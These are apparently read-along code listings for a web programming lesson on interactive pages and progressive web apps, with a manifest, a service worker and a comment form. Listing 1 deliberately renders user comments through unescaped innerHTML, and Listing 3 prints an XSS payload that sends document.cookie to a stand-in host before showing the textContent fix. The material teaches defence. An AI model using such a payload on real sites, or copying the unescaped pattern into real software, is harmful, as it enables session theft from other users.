---
title: "Supplementary Materials — Applications of Web Programming"
module: PFW
lesson: "11.1"
script: script.md
---

# Supplementary Materials

Code listings for this episode. Nothing here is spoken in the audio — it's the read-along
reference. The narration names the three application types (I-E-P) and the parts that make a
PWA (MISO); these listings let you see the concrete shapes behind those terms.

### Listing 1 — Static page vs. interactive page (the difference the narration describes)

```html
<!-- STATIC: the server hands back the same bytes every time. No behaviour. -->
<!DOCTYPE html>
<html lang="en">
  <body>
    <h1>Comments</h1>
    <p>Nice article!</p>            <!-- baked in; never changes without a redeploy -->
  </body>
</html>

<!-- INTERACTIVE: client-side JavaScript updates the page in response to the user,
     talking to the server in the background with no full reload. -->
<!DOCTYPE html>
<html lang="en">
  <body>
    <h1>Comments</h1>
    <ul id="comments"></ul>
    <form id="comment-form">
      <input id="content" placeholder="Add a comment" required />
      <button type="submit">Post</button>
    </form>

    <script>
      const list = document.getElementById("comments");

      async function load() {
        const res = await fetch("/api/comments");      // background request, no reload
        const data = await res.json();
        list.innerHTML = data.comments
          .map(c => `<li>${c.content}</li>`)            // NOTE: unescaped — see Listing 3
          .join("");
      }

      document.getElementById("comment-form").addEventListener("submit", async (e) => {
        e.preventDefault();
        const content = document.getElementById("content").value;
        await fetch("/api/comments", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content }),
        });
        load();                                          // re-render instantly
      });

      load();
    </script>
  </body>
</html>
```

### Listing 2 — The two files that make a website a PWA (Manifest + Service worker)

```json
// manifest.webmanifest — makes the app installable (the "M" and "I" of MISO)
{
  "name": "Field Notes",
  "short_name": "Notes",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#2196F3",
  "icons": [
    { "src": "/icons/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icons/icon-512.png", "sizes": "512x512", "type": "image/png" }
  ]
}
```

```javascript
// sw.js — the service worker: caches the app shell, then serves it offline (the "S" and "O")
const CACHE = "field-notes-v1";
const SHELL = ["/", "/static/app.js", "/icons/icon-192.png"];

self.addEventListener("install", (event) => {
  event.waitUntil(caches.open(CACHE).then((c) => c.addAll(SHELL)));
});

self.addEventListener("fetch", (event) => {
  // Try the cache first; fall back to the network. This is what "works offline" means.
  event.respondWith(
    caches.match(event.request).then((cached) => cached || fetch(event.request))
  );
});
```

### Listing 3 — Why interactivity raises a security question (forward-link to Secure Software Architecture)

```javascript
// The interactive comment list from Listing 1 dropped raw user input into the page:
list.innerHTML = data.comments.map(c => `<li>${c.content}</li>`).join("");

// If a user submits this as their "comment":
//   <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
// ...it runs in every other reader's browser. That is cross-site scripting (XSS).
// The fix is to treat the comment as text, never as HTML:
const li = document.createElement("li");
li.textContent = c.content;   // textContent escapes it; innerHTML would execute it
list.appendChild(li);

// XSS is taught properly in Secure Software Architecture — this listing just shows
// where the door is. The more interactive the site, the more such doors exist.
```
